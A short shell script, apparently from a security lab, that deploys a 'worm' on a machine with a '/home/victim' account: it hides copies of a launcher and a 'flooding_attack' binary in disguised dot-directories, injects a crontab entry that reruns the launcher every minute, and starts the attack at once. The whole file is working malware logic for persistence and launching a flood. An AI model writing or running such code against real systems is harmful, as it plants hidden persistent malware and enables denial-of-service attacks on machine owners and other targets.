#/bin/sh

inject_crontab() {
  echo "Injecting Crontab..."
  local crontab_command='* * * * * [ -f /home/victim/.Launch_Attack/launching_attack.sh ] && /home/victim/.Launch_Attack/launching_attack.sh'
  crontab -l > /tmp/tmp_cron
  cat /tmp/tmp_cron | grep -Fxq "$crontab_command"
  if [ $? -eq 0 ]; then # positive match
    echo "Crontab Already Injected!"
  else
    echo "$crontab_command" >> /tmp/tmp_cron
    crontab /tmp/tmp_cron
    echo "Crontab Injected!"
  fi
  rm /tmp/tmp_cron
}

main() {
  echo "Launching Worm..."
  local home_dir="/home/victim"
  local launch_dir=".Launch_Attack"
  local dir01=".etc"
  local dir02=".var"
  local module_dir=".module"
  local launch_file="launching_attack.sh"
  local flooding_file="flooding_attack"
  mkdir -p "$home_dir/$launch_dir"
  mkdir -p "$home_dir/$dir01/$module_dir"
  mkdir -p "$home_dir/$dir02/$module_dir"
  cp "$PWD/b" "$flooding_file" # reuse the provided file
  cp "$PWD/$launch_file" "$home_dir/$launch_dir"
  cp "$PWD/$launch_file" "$PWD/$flooding_file" "$home_dir/$dir01/$module_dir"
  cp "$PWD/$launch_file" "$PWD/$flooding_file" "$home_dir/$dir02/$module_dir"
  inject_crontab
  $home_dir/$launch_dir/$launch_file # launch attack!
  echo "Worms Deploy Finished!"
}
main
